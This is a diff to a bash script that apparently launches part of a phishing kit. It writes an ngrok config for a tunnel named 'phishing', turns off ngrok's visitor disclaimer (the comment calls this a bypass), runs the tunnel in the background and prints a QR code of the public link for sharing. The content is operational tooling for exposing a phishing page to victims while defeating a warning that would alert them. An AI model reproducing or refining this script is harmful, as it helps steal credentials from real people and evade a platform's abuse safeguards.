@@ -18,21 +18,21 @@ echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Starting Ngrok on port $port..."
 # Create the .server directory if it doesn't exist
 mkdir -p .server
 
-# Create a v3-compatible ngrok config to bypass the disclaimer
+# Create a compatible ngrok v3 config to bypass the disclaimer
 cat > .server/ngrok.yml <<EOF
 version: "3"
 agent:
-  authtoken: $(ngrok config get agent.authtoken 2>/dev/null)
-  web_addr: 127.0.0.1:4040
+  authtoken: $(ngrok config get authtoken 2>/dev/null)
 tunnels:
   phishing:
-    proto: http
     addr: $port
-    inspect: false
+    proto: http
+    schemes:
+      - https
 EOF
 
 # Start ngrok with the custom config
-ngrok start --all --config=.server/ngrok.yml > /dev/null &
+ngrok start --config=.server/ngrok.yml phishing > /dev/null &
 ngrok_pid=$!
 echo $ngrok_pid > ".server/ngrok.pid"
 
@@ -57,4 +57,3 @@ if command -v qrencode &> /dev/null; then
     echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Generating QR code for easy sharing..."
     qrencode -t ANSI $ngrok_url
 fi
-
